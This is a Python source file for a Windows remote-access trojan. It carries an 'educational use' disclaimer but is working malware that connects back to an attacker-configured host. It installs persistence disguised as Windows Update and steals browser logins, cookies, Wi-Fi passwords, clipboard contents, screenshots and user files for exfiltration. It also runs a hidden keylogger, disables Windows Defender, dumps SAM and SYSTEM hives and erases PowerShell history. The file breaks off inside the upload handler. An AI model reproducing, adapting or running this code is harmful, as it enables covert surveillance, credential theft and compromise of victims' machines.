#!/usr/bin/env python3
# victim_win.py v2.0 - Advanced Windows Reverse Shell
# Educational use / authorized pentesting only

# -------------------- IMPORTS --------------------
import socket               # TCP socket communication
import subprocess           # Execute system commands and PowerShell
import os                   # File system operations, environment variables
import sys                  # System-specific parameters (executable path, exit)
import time                 # Reconnection delay
import base64               # Encode file chunks for safe transmission
import shutil               # High-level file operations (copy2, rmtree)
import getpass              # Retrieve current username
import winreg               # Windows registry manipulation for persistence
import zipfile              # Create ZIP archives for data exfiltration
import tempfile             # Get temporary directory for storing archives
import datetime             # Generate timestamps for file names
import ctypes               # Check admin privileges and interact with Windows API
import glob                 # Pattern matching for file cleanup

# -------------------- CONFIGURATION --------------------
ATTACKER_IP = "CHANGE_ME"           # Attacker's IP address (modify before deployment)
ATTACKER_PORT = 4444                # Port on which the listener is waiting
XOR_KEY = 0x42                      # Static XOR key for basic traffic obfuscation
RECONNECT_DELAY = 5                 # Seconds to wait before reconnecting after a failure

# Persistence configuration
PERSIST_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
PERSIST_NAME = "WindowsUpdateService"
PERSIST_SCRIPT = os.path.join(os.environ.get('APPDATA', ''), "svchost_update.pyw")
PERSIST_TASK_NAME = "WindowsUpdateCheck"

# Commonly used environment paths
TEMP = tempfile.gettempdir()
USER_PROFILE = os.environ.get('USERPROFILE', '')
APPDATA = os.environ.get('APPDATA', '')
LOCAL_APPDATA = os.environ.get('LOCALAPPDATA', '')

# ===================== CRYPTO =====================

def xor_encrypt_decrypt(data: bytes) -> bytes:
    """
    Apply XOR cipher to the given data using the global XOR_KEY.
    Since XOR is symmetric, the same function is used for both encryption and decryption.
    """
    return bytes([b ^ XOR_KEY for b in data])

def send_encrypted(sock: socket.socket, data):
    """
    Send data over the socket with encryption and length prefix.
    Protocol: [4-byte big-endian length] + [XORed payload]
    If data is a string, it is encoded to UTF-8.
    """
    if isinstance(data, str):
        data = data.encode('utf-8')
    encrypted = xor_encrypt_decrypt(data)
    # Prefix with the length of the encrypted payload
    sock.send(len(encrypted).to_bytes(4, 'big'))
    sock.send(encrypted)

def recv_encrypted(sock: socket.socket) -> str | None:
    """
    Receive an encrypted message from the socket.
    Returns the decrypted plaintext string, or None if the connection was closed.
    """
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = int.from_bytes(raw_len, 'big')
    data = b''
    # Receive exactly 'length' bytes, handling partial reads
    while len(data) < length:
        chunk = sock.recv(min(4096, length - len(data)))
        if not chunk:
            break
        data += chunk
    # Decrypt and decode as UTF-8, replacing any invalid sequences
    return xor_encrypt_decrypt(data).decode('utf-8', errors='replace')

# ===================== HELPERS =====================

def run_cmd(cmd: str, timeout: int = 30) -> str:
    """
    Execute a system command (cmd.exe) and capture its output.
    Uses CREATE_NO_WINDOW (0x08000000) to avoid console popups.
    """
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                              timeout=timeout, creationflags=0x08000000)
        output = proc.stdout + proc.stderr
        return output.strip() if output.strip() else "[+] Executed (no output)"
    except subprocess.TimeoutExpired:
        return f"[-] Timeout ({timeout}s)"
    except Exception as e:
        return f"[-] Error: {e}"

def run_ps(cmd: str, timeout: int = 60) -> str:
    """
    Execute a PowerShell command with execution policy bypassed.
    """
    try:
        proc = subprocess.run(
            ['powershell', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', cmd],
            capture_output=True, text=True, timeout=timeout, creationflags=0x08000000)
        output = proc.stdout + proc.stderr
        return output.strip() if output.strip() else "[+] Executed (no output)"
    except subprocess.TimeoutExpired:
        return f"[-] PS timeout ({timeout}s)"
    except Exception as e:
        return f"[-] PS error: {e}"

def send_file_over_socket(sock: socket.socket, filepath: str) -> bool:
    """
    Send a file to the listener using the custom protocol:
    FILE_START, then base64 chunks (3KB each), then FILE_END.
    Returns True on success, False on failure.
    """
    try:
        send_encrypted(sock, "FILE_START")
        with open(filepath, 'rb') as f:
            while True:
                chunk = f.read(3 * 1024)  # 3 KB chunks
                if not chunk:
                    break
                send_encrypted(sock, base64.b64encode(chunk).decode('ascii'))
        send_encrypted(sock, "FILE_END")
        return True
    except Exception:
        # Attempt to send FILE_END even on error to keep protocol aligned
        try:
            send_encrypted(sock, "FILE_END")
        except:
            pass
        return False

def safe_remove(path: str):
    """Remove a file or directory without raising exceptions."""
    try:
        if os.path.isdir(path):
            shutil.rmtree(path, ignore_errors=True)
        elif os.path.isfile(path):
            os.remove(path)
    except:
        pass

def safe_copy(src: str, dst: str) -> bool:
    """Copy a file only if source exists. Returns True on success."""
    try:
        if os.path.exists(src):
            shutil.copy2(src, dst)
            return True
    except:
        pass
    return False

def is_admin() -> bool:
    """Check if the current process has administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# ===================== PERSISTENCE =====================

def install_persistence(method: str = "all") -> str:
    """
    Install persistence using the specified method(s).
    Methods: 'all', 'registry', 'task', 'startup'.
    Returns a status message.
    """
    results = []
    # First, copy the script to the persistent location if not already there
    try:
        if not os.path.exists(PERSIST_SCRIPT) or os.path.realpath(__file__) != os.path.realpath(PERSIST_SCRIPT):
            shutil.copy2(__file__, PERSIST_SCRIPT)
    except Exception as e:
        results.append(f"[-] Error copying script: {e}")

    # Use pythonw.exe to avoid console windows
    exe = sys.executable.replace("python.exe", "pythonw.exe")

    if method in ("all", "registry"):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, PERSIST_NAME, 0, winreg.REG_SZ, f'"{exe}" "{PERSIST_SCRIPT}"')
            winreg.CloseKey(key)
            results.append("[+] Persistence: Registry (HKCU Run) ✓")
        except Exception as e:
            results.append(f"[-] Registry: {e}")

    if method in ("all", "task"):
        cmd = f'schtasks /create /tn "{PERSIST_TASK_NAME}" /tr "\\"{exe}\\" \\"{PERSIST_SCRIPT}\\"" /sc onlogon /rl limited /f'
        r = run_cmd(cmd)
        if any(w in r.lower() for w in ["correctamente", "successfully", "éxito", "success"]):
            results.append("[+] Persistence: Scheduled task ✓")
        else:
            results.append(f"[-] Task: {r[:100]}")

    if method in ("all", "startup"):
        try:
            startup = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if os.path.exists(startup):
                vbs = os.path.join(startup, "WindowsUpdate.vbs")
                with open(vbs, 'w') as f:
                    f.write(f'CreateObject("WScript.Shell").Run """" & "{exe}" & """" & " " & """" & "{PERSIST_SCRIPT}" & """", 0, False')
                results.append("[+] Persistence: Startup folder ✓")
            else:
                results.append("[-] Startup: folder not found")
        except Exception as e:
            results.append(f"[-] Startup: {e}")

    return "\n".join(results) if results else "[-] Unrecognized method"

def check_persistence() -> str:
    """Report the status of all three persistence methods."""
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_READ)
        val, _ = winreg.QueryValueEx(key, PERSIST_NAME)
        winreg.CloseKey(key)
        results.append(f"[+] Registry: ACTIVE → {val}")
    except:
        results.append("[-] Registry: NO")

    o = run_cmd(f'schtasks /query /tn "{PERSIST_TASK_NAME}" 2>nul')
    results.append("[+] Task: ACTIVE" if PERSIST_TASK_NAME in o else "[-] Task: NO")

    vbs = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.vbs")
    results.append("[+] Startup: ACTIVE" if os.path.exists(vbs) else "[-] Startup: NO")
    results.append("[+] Script: exists" if os.path.exists(PERSIST_SCRIPT) else "[-] Script: NO")
    return "\n".join(results)

def remove_persistence() -> str:
    """Remove all traces of persistence."""
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, PERSIST_NAME)
        winreg.CloseKey(key)
        results.append("[+] Registry removed")
    except:
        results.append("[-] Registry: not found")
    run_cmd(f'schtasks /delete /tn "{PERSIST_TASK_NAME}" /f 2>nul')
    results.append("[+] Task removed")
    vbs = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.vbs")
    safe_remove(vbs)
    results.append("[+] Startup removed")
    safe_remove(PERSIST_SCRIPT)
    results.append("[+] Script removed")
    return "\n".join(results)

# ===================== SYSINFO (returns tar path) =====================

def gather_sysinfo() -> str:
    """
    Collect extensive system information, package it into a .tar archive,
    and return the path to the archive (or error message).
    """
    import tarfile
    info_dir = os.path.join(TEMP, "si_" + datetime.datetime.now().strftime('%H%M%S'))
    os.makedirs(info_dir, exist_ok=True)

    # Dictionary of text files to generate via cmd commands
    cmds = {
        "systeminfo.txt": "systeminfo",
        "ipconfig.txt": "ipconfig /all",
        "services.txt": "sc query",
        "processes.txt": "tasklist /v",
        "users.txt": "net user",
        "admins.txt": "net localgroup administrators",
        "env.txt": "set",
        "arp.txt": "arp -a",
        "routes.txt": "route print",
        "shares.txt": "net share",
        "netstat.txt": "netstat -ano",
        "dns_cache.txt": "ipconfig /displaydns",
        "firewall.txt": "netsh advfirewall show allprofiles",
        "hotfixes.txt": "wmic qfe list full",
        "drives.txt": "wmic logicaldisk get caption,description,freespace,size",
        "startup_items.txt": "wmic startup list full",
        "whoami_all.txt": "whoami /all",
    }
    for fname, c in cmds.items():
        out = run_cmd(c, timeout=45)
        try:
            with open(os.path.join(info_dir, fname), 'w', encoding='utf-8', errors='replace') as f:
                f.write(out)
        except:
            pass

    # Copy hosts file
    safe_copy(r"C:\Windows\System32\drivers\etc\hosts", os.path.join(info_dir, "hosts"))

    # Export WiFi profiles (XML files with passwords)
    wifi_dir = os.path.join(info_dir, "wifi")
    os.makedirs(wifi_dir, exist_ok=True)
    run_cmd(f'netsh wlan export profile key=clear folder="{wifi_dir}"', timeout=15)

    # Export relevant registry keys
    for fname, regpath in {
        "autorun_hkcu.reg": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "autorun_hklm.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "installed.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
    }.items():
        run_cmd(f'reg export "{regpath}" "{os.path.join(info_dir, fname)}" /y', timeout=30)

    # PowerShell-based extra info
    for fname, pcmd in {
        "installed_software.txt": "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -EA SilentlyContinue | Select DisplayName,DisplayVersion,Publisher | Sort DisplayName | FT -Auto | Out-String -Width 200",
        "scheduled_tasks.txt": "Get-ScheduledTask | Where {$_.State -ne 'Disabled'} | Select TaskName,TaskPath,State | FT -Auto | Out-String -Width 200",
        "antivirus.txt": "Get-MpComputerStatus -EA SilentlyContinue | FL | Out-String -Width 200",
    }.items():
        out = run_ps(pcmd, timeout=60)
        try:
            with open(os.path.join(info_dir, fname), 'w', encoding='utf-8', errors='replace') as f:
                f.write(out)
        except:
            pass

    # Create tar archive
    tar_path = os.path.join(TEMP, "sysinfo.tar")
    try:
        with tarfile.open(tar_path, 'w') as tar:
            tar.add(info_dir, arcname="sysinfo")
        safe_remove(info_dir)
        return tar_path
    except Exception as e:
        safe_remove(info_dir)
        return f"[-] Tar error: {e}"

# ===================== SCREENSHOT =====================

def take_screenshot() -> str:
    """Take a screenshot of the primary monitor and return the path to the PNG."""
    sc_path = os.path.join(TEMP, "sc.png")
    ps = f'''Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($b.Width,$b.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
$bmp.Save("{sc_path}")
$g.Dispose(); $bmp.Dispose()'''
    run_ps(ps, timeout=15)
    return sc_path if os.path.exists(sc_path) else "[-] Screenshot failed"

# ===================== WIFI =====================

def get_wifi_passwords() -> str:
    """Retrieve all saved WiFi passwords in plain text."""
    out = run_cmd("netsh wlan show profiles", timeout=15)
    if "no hay" in out.lower() or "is not" in out.lower() or "no se" in out.lower():
        return "[-] No WiFi profiles or WLAN unavailable"
    results = []
    for line in out.split('\n'):
        if "Perfil de todos los usuarios" in line or "All User Profile" in line:
            name = line.split(':')[1].strip() if ':' in line else None
            if name:
                detail = run_cmd(f'netsh wlan show profile name="{name}" key=clear', timeout=10)
                pwd = ""
                for dl in detail.split('\n'):
                    if "Contenido de la clave" in dl or "Key Content" in dl:
                        pwd = dl.split(':')[1].strip() if ':' in dl else "N/A"
                        break
                results.append(f"  {name}  →  {pwd if pwd else 'N/A'}")
    return "[+] WiFi:\n" + "\n".join(results) if results else "[-] No passwords"

# ===================== CLIPBOARD =====================

def get_clipboard() -> str:
    """Return the current content of the clipboard."""
    r = run_ps("Get-Clipboard -EA SilentlyContinue", timeout=10)
    return f"[+] Clipboard:\n{r}" if r and not r.startswith("[-]") else "[-] Clipboard empty"

# ===================== SOFTWARE =====================

def get_installed_software() -> str:
    """List all installed software via PowerShell."""
    ps = '''$s=@(); @('HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*') | %{ $s += Get-ItemProperty $_ -EA SilentlyContinue | Where {$_.DisplayName} | Select DisplayName,DisplayVersion,Publisher }; $s | Sort DisplayName -Unique | FT -Auto | Out-String -Width 300'''
    return run_ps(ps, timeout=60)

# ===================== BROWSERS =====================

def steal_browsers() -> str:
    """
    Steal browser data (Login Data, Cookies, History, etc.) from Chrome, Edge,
    Brave, Opera, and Firefox. Returns path to a ZIP archive or error message.
    """
    bdir = os.path.join(TEMP, "br_" + datetime.datetime.now().strftime('%H%M%S'))
    os.makedirs(bdir, exist_ok=True)
    found = False
    targets = ["Login Data", "Cookies", "History", "Bookmarks", "Web Data"]

    # Chromium-based browsers
    for bname, base in [
        ("Chrome", os.path.join(LOCAL_APPDATA, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(LOCAL_APPDATA, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(LOCAL_APPDATA, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Opera", os.path.join(APPDATA, "Opera Software", "Opera Stable")),
    ]:
        if not os.path.exists(base):
            continue
        out = os.path.join(bdir, bname)
        os.makedirs(out, exist_ok=True)
        default = os.path.join(base, "Default")
        if os.path.exists(default):
            for t in targets:
                if safe_copy(os.path.join(default, t), os.path.join(out, f"Default_{t}")):
                    found = True
        safe_copy(os.path.join(base, "Local State"), os.path.join(out, "Local_State"))

    # Firefox
    ff = os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles")
    if os.path.exists(ff):
        for prof in glob.glob(os.path.join(ff, "*.default*")):
            pout = os.path.join(bdir, "Firefox", os.path.basename(prof))
            os.makedirs(pout, exist_ok=True)
            for f in ["places.sqlite", "cookies.sqlite", "logins.json", "key4.db", "cert9.db"]:
                if safe_copy(os.path.join(prof, f), os.path.join(pout, f)):
                    found = True

    if not found:
        safe_remove(bdir)
        return "[-] No browser data found"

    zpath = os.path.join(TEMP, "browsers.zip")
    try:
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(bdir):
                for file in files:
                    fp = os.path.join(root, file)
                    try:
                        zf.write(fp, os.path.relpath(fp, bdir))
                    except:
                        pass
        safe_remove(bdir)
        return zpath
    except Exception as e:
        safe_remove(bdir)
        return f"[-] Error: {e}"

# ===================== PRIVESC CHECK =====================

def check_privesc() -> str:
    """Analyze common privilege escalation vectors."""
    r = []
    r.append("=== ADMIN: {} ===".format("YES" if is_admin() else "NO"))
    r.append("\n=== PRIVILEGES ===")
    r.append(run_cmd("whoami /priv"))
    r.append("\n=== GROUPS ===")
    r.append(run_cmd("whoami /groups"))
    r.append("\n=== UNQUOTED SERVICE PATHS ===")
    r.append(run_ps("Get-WmiObject Win32_Service -EA SilentlyContinue | Where { $_.PathName -notlike '\"*' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\\Windows\\*' } | Select Name,PathName,StartMode | FT -Auto | Out-String -Width 300", timeout=30))
    # AlwaysInstallElevated check
    r.append("\n=== AlwaysInstallElevated ===")
    o1 = run_cmd('reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul')
    o2 = run_cmd('reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul')
    r.append("[!] ENABLED" if "0x1" in o1 and "0x1" in o2 else "[-] Not enabled")
    # Writable PATH directories
    r.append("\n=== WRITABLE DIRS IN PATH ===")
    for d in os.environ.get('PATH', '').split(';'):
        d = d.strip()
        if d and os.path.exists(d) and os.access(d, os.W_OK):
            r.append(f"  [!] {d}")
    r.append("\n=== STORED CREDENTIALS ===")
    r.append(run_cmd("cmdkey /list"))
    return "\n".join(r)

# ===================== STEAL FILES =====================

def steal_files() -> str:
    """Archive common user folders and return path to ZIP."""
    if not USER_PROFILE:
        return "[-] No USERPROFILE"
    folders = {n: os.path.join(USER_PROFILE, n) for n in ['Desktop', 'Downloads', 'Documents', 'Pictures', 'Videos']}
    existing = {n: p for n, p in folders.items() if os.path.exists(p)}
    if not existing:
        return "[-] No folders found"
    zpath = os.path.join(TEMP, f"steal_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
    try:
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for fn, fp in existing.items():
                for root, dirs, files in os.walk(fp):
                    for file in files:
                        full = os.path.join(root, file)
                        try:
                            zf.write(full, os.path.join(fn, os.path.relpath(full, fp)))
                        except:
                            continue
        return zpath
    except Exception as e:
        return f"[-] ZIP error: {e}"

# ===================== EXFIL COMPLETO =====================

def full_exfil() -> str:
    """Perform a total exfiltration: sysinfo + wifi + screenshot + clipboard + browsers + software + registry."""
    import tarfile
    edir = os.path.join(TEMP, "ex_" + datetime.datetime.now().strftime('%H%M%S'))
    os.makedirs(edir, exist_ok=True)

    # Core sysinfo subset
    si = os.path.join(edir, "sysinfo")
    os.makedirs(si, exist_ok=True)
    for fname, c in {"systeminfo.txt": "systeminfo", "ipconfig.txt": "ipconfig /all", "processes.txt": "tasklist /v",
                      "users.txt": "net user", "netstat.txt": "netstat -ano", "whoami.txt": "whoami /all"}.items():
        try:
            with open(os.path.join(si, fname), 'w', encoding='utf-8', errors='replace') as f:
                f.write(run_cmd(c, timeout=45))
        except:
            pass
    safe_copy(r"C:\Windows\System32\drivers\etc\hosts", os.path.join(si, "hosts"))

    # WiFi passwords
    with open(os.path.join(edir, "wifi.txt"), 'w', encoding='utf-8') as f:
        f.write(get_wifi_passwords())
    wdir = os.path.join(edir, "wifi_profiles")
    os.makedirs(wdir, exist_ok=True)
    run_cmd(f'netsh wlan export profile key=clear folder="{wdir}"', timeout=15)

    # Screenshot
    sc = take_screenshot()
    if os.path.exists(str(sc)):
        safe_copy(sc, os.path.join(edir, "screenshot.png"))
        safe_remove(sc)

    # Clipboard
    with open(os.path.join(edir, "clipboard.txt"), 'w', encoding='utf-8') as f:
        f.write(get_clipboard())

    # Browsers
    br = steal_browsers()
    if os.path.exists(str(br)):
        safe_copy(br, os.path.join(edir, "browsers.zip"))
        safe_remove(br)

    # Software
    with open(os.path.join(edir, "software.txt"), 'w', encoding='utf-8') as f:
        f.write(get_installed_software())

    # Registry exports
    rdir = os.path.join(edir, "registry")
    os.makedirs(rdir, exist_ok=True)
    for fname, rp in {"autorun_hkcu.reg": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                       "autorun_hklm.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                       "installed.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"}.items():
        run_cmd(f'reg export "{rp}" "{os.path.join(rdir, fname)}" /y', timeout=30)

    # Stored credentials
    with open(os.path.join(edir, "credentials.txt"), 'w', encoding='utf-8') as f:
        f.write(run_cmd("cmdkey /list"))

    tar_path = os.path.join(TEMP, "exfil.tar")
    try:
        with tarfile.open(tar_path, 'w') as tar:
            tar.add(edir, arcname="exfil")
        safe_remove(edir)
        return tar_path
    except Exception as e:
        safe_remove(edir)
        return f"[-] Tar error: {e}"

# ===================== DEFENDER =====================

def disable_defender() -> str:
    """Attempt to disable Windows Defender (requires admin)."""
    if not is_admin():
        return "[-] Requires admin"
    r = []
    for name, c in [
        ('RealTime', 'Set-MpPreference -DisableRealtimeMonitoring $true'),
        ('Behavior', 'Set-MpPreference -DisableBehaviorMonitoring $true'),
        ('Script', 'Set-MpPreference -DisableScriptScanning $true'),
        ('IOAV', 'Set-MpPreference -DisableIOAVProtection $true'),
        ('Excl TEMP', f'Add-MpPreference -ExclusionPath "{TEMP}"'),
        ('Excl APPDATA', f'Add-MpPreference -ExclusionPath "{APPDATA}"'),
    ]:
        o = run_ps(c, timeout=15)
        r.append(f"{'[+]' if 'error' not in o.lower() and 'denied' not in o.lower() else '[-]'} {name}")
    return "\n".join(r)

# ===================== DUMP HASHES =====================

def dump_hashes() -> str:
    """Save SAM, SYSTEM, SECURITY hives for offline hash extraction (requires admin)."""
    if not is_admin():
        return "[-] Requires admin"
    r = []
    paths = []
    for name, hive in [("SAM", "SAM"), ("SYSTEM", "SYSTEM"), ("SECURITY", "SECURITY")]:
        p = os.path.join(TEMP, f"{name.lower()}.save")
        run_cmd(f'reg save HKLM\\{hive} "{p}" /y')
        if os.path.exists(p):
            r.append(f"[+] {name} → {p}")
            paths.append(p)
        else:
            r.append(f"[-] {name}: failed")
    if paths:
        r.append("\n[*] Download with: download <path>")
    return "\n".join(r)

# ===================== KEYLOGGER =====================

_keylog_active = False
_keylog_file = os.path.join(TEMP, "kl.txt")

def keylog_control(action: str) -> str:
    """Control the PowerShell keylogger: start, stop, dump, clear."""
    global _keylog_active
    if action == "start":
        if _keylog_active:
            return "[*] Already active"
        ps_script = r'''Add-Type -AssemblyName System.Windows.Forms
$sig=@"
[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")]public static extern int GetWindowText(IntPtr h,System.Text.StringBuilder s,int n);
[DllImport("user32.dll")]public static extern IntPtr GetForegroundWindow();
"@
$A=Add-Type -MemberDefinition $sig -Name W -Namespace K -PassThru
$f="''' + _keylog_file + r'''"
$lw=""
while($true){Start-Sleep -M 40
$sb=New-Object System.Text.StringBuilder 256
[K.W]::GetWindowText([K.W]::GetForegroundWindow(),$sb,256)|Out-Null
$cw=$sb.ToString()
if($cw -ne $lw){$lw=$cw;"`r`n--- [$cw] $(Get-Date -F 'HH:mm:ss') ---`r`n"|Out-File $f -Append}
for($i=8;$i -le 190;$i++){if([K.W]::GetAsyncKeyState($i) -eq -32767){$k=[System.Windows.Forms.Keys]$i
switch($k){'Space'{' '|Out-File $f -A -NoNewline}'Return'{"`r`n"|Out-File $f -A -NoNewline}'Back'{'[BS]'|Out-File $f -A -NoNewline}default{"$k"|Out-File $f -A -NoNewline}}}}}'''
        ps_path = os.path.join(TEMP, "kl.ps1")
        try:
            with open(ps_path, 'w') as f:
                f.write(ps_script)
            subprocess.Popen(['powershell', '-NoProfile', '-EP', 'Bypass', '-WindowStyle', 'Hidden', '-File', ps_path],
                             creationflags=0x08000000)
            _keylog_active = True
            return "[+] Keylogger started"
        except Exception as e:
            return f"[-] Error: {e}"
    elif action == "stop":
        run_ps("Get-Process powershell -EA SilentlyContinue | Where {$_.CommandLine -like '*kl.ps1*'} | Stop-Process -Force -EA SilentlyContinue")
        _keylog_active = False
        safe_remove(os.path.join(TEMP, "kl.ps1"))
        return "[+] Keylogger stopped"
    elif action == "dump":
        if os.path.exists(_keylog_file):
            try:
                with open(_keylog_file, 'r', encoding='utf-8', errors='replace') as f:
                    return f"[+] Keylog:\n{f.read()}"
            except Exception as e:
                return f"[-] Error: {e}"
        return "[-] No data"
    elif action == "clear":
        safe_remove(_keylog_file)
        return "[+] Keylog cleared"
    return "[-] Usage: keylog start|stop|dump|clear"

# ===================== CLEANUP =====================

def cleanup() -> str:
    """Delete all temporary files created by the agent and clear PowerShell history."""
    r = []
    for pat in ["si_*", "br_*", "ex_*", "sc.png", "sysinfo.tar", "browsers.zip", "exfil.tar",
                "steal_*.zip", "kl.txt", "kl.ps1", "sam.save", "system.save", "security.save"]:
        for f in glob.glob(os.path.join(TEMP, pat)):
            safe_remove(f)
            r.append(f"  Removed: {os.path.basename(f)}")
    # Clear PowerShell history
    psh = os.path.join(APPDATA, "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
    if os.path.exists(psh):
        try:
            open(psh, 'w').close()
            r.append("  PS history cleared")
        except:
            pass
    return "[+] Cleanup:\n" + "\n".join(r) if r else "[+] Nothing to clean"

# ===================== LS =====================

def list_directory(path: str = ".") -> str:
    """List directory contents with details (size, modification time)."""
    try:
        path = os.path.abspath(path)
        if not os.path.isdir(path):
            return f"[-] Not a directory: {path}"
        r = [f"Directory: {path}\n"]
        dirs, files = [], []
        for e in sorted(os.listdir(path)):
            full = os.path.join(path, e)
            try:
                st = os.stat(full)
                mt = datetime.datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')
                if os.path.isdir(full):
                    dirs.append(f"  [DIR]  {mt}            {e}")
                else:
                    files.append(f"  [FILE] {mt} {st.st_size:>10} {e}")
            except:
                files.append(f"  [???]                      {e}")
        r.extend(dirs)
        r.extend(files)
        r.append(f"\n  {len(dirs)} dirs, {len(files)} files")
        return "\n".join(r)
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== STATUS =====================

def get_system_status() -> str:
    """Return quick system status: user, hostname, local IP, admin, PID, cwd."""
    try:
        user = getpass.getuser()
        host = socket.gethostname()
        admin = "YES" if is_admin() else "NO"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
            s.close()
        except:
            ip = "N/A"
        pid = os.getpid()
        return f"User: {user}\nHost: {host}\nIP: {ip}\nAdmin: {admin}\nPID: {pid}\nDir: {os.getcwd()}"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== ALERT =====================

def show_alert(msg: str) -> str:
    """Display a popup message box on the victim's desktop."""
    ps = f'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("{msg}","System","OK","Information")'
    try:
        subprocess.run(['powershell', '-Command', ps], timeout=10, capture_output=True, creationflags=0x08000000)
        return "[+] Alert displayed"
    except:
        return "[-] Error displaying alert"

# ===================== HELP =====================

HELP_TEXT = """
═══════════════════════════════════════════════════
  AVAILABLE COMMANDS
═══════════════════════════════════════════════════

  NAVIGATION:
    cd <dir>              Change directory
    pwd                   Print working directory
    ls [dir]              List directory contents

  FILES:
    download <file>       Download file from victim
    upload <file>         Upload file to victim

  COLLECTION (return a file):
    steal                 Steal Desktop/Downloads/Documents/Pictures/Videos
    sysinfo               Full system info (tar)
    screenshot            Take a screenshot
    browsers              Steal browser data (cookies, passwords, history)
    exfil                 TOTAL exfiltration (sysinfo+wifi+browsers+screenshot+clipboard)

  INFORMATION (return text):
    status                Basic info (user, host, IP, admin)
    wifi                  Saved WiFi passwords
    clipboard             Current clipboard content
    software              Installed software
    privesc               Privilege escalation vectors

  PERSISTENCE:
    persist [all|registry|task|startup]   Install persistence
    persist check         Check persistence status
    persist remove        Remove all persistence

  KEYLOGGER:
    keylog start          Start keylogger
    keylog stop           Stop keylogger
    keylog dump           View captured keystrokes
    keylog clear          Clear log

  ADMIN (requires privileges):
    disable_defender      Disable Windows Defender
    dump_hashes           Extract SAM/SYSTEM/SECURITY

  UTILITIES:
    alert <msg>           Show popup message
    cleanup               Delete temporary files and traces
    ps <cmd>              Execute PowerShell command
    exit                  Close connection (victim will reconnect)
    kill                  Kill victim process permanently
    <any command>         Execute in cmd

═══════════════════════════════════════════════════
"""

# ===================== MAIN DISPATCH =====================
# Commands that return a file (status_msg + FILE_START/data/FILE_END)
FILE_COMMANDS = {"steal", "sysinfo", "screenshot", "browsers", "exfil"}

def handle_command(sock: socket.socket, cmd: str) -> bool:
    """
    Process a command received from the listener and send the response.
    Returns False if the connection should be closed (e.g., 'exit').
    """
    if cmd == "exit":
        return False
    elif cmd == "kill":
        sock.close()
        sys.exit(0)
    elif cmd == "help":
        send_encrypted(sock, HELP_TEXT)

    # --- Navigation ---
    elif cmd == "pwd":
        send_encrypted(sock, os.getcwd())
    elif cmd.startswith("cd "):
        try:
            os.chdir(cmd[3:].strip())
            send_encrypted(sock, f"[+] {os.getcwd()}")
        except Exception as e:
            send_encrypted(sock, f"[-] {e}")
    elif cmd == "ls":
        send_encrypted(sock, list_directory())
    elif cmd.startswith("ls "):
        send_encrypted(sock, list_directory(cmd[3:].strip()))

    # --- File transfer ---
    elif cmd.startswith("download "):
        fname = cmd[9:].strip()
        if not os.path.exists(fname):
            send_encrypted(sock, f"[-] Does not exist: {fname}")
        else:
            try:
                send_encrypted(sock, "FILE_START")
                with open(fname, 'rb') as f:
                    while True:
                        chunk = f.read(3 * 1024)
                        if not chunk:
                            break
                        send_encrypted(sock, base64.b64encode(chunk).decode('ascii'))
                send_encrypted(sock, "FILE_END")
            except Exception as e:
                send_encrypted(sock, "FILE_END")
    elif cmd.startswith("upload "):
        fname = cmd[7:].strip()
